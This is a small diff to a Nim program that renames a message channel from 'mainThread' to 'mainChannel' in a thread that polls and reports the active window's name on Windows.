@@ -12,7 +12,7 @@ from winim/winstr import `$`
 
 from ../constants import BUFFER_LENGTH
 
-from ../channels import mainThread
+from ../channels import mainChannel
 
 type windowNameResult = tuple[worked: bool, data: string]
 
@@ -38,7 +38,7 @@ proc initWindowNameThread*(): void {.thread.} =
     let (worked, windowName) = getWindowName()
 
     if worked == true and windowName != prevWindowName:
-      mainThread.send windowName
+      mainChannel.send windowName
       prevWindowName = windowName
 
     sleep(1)
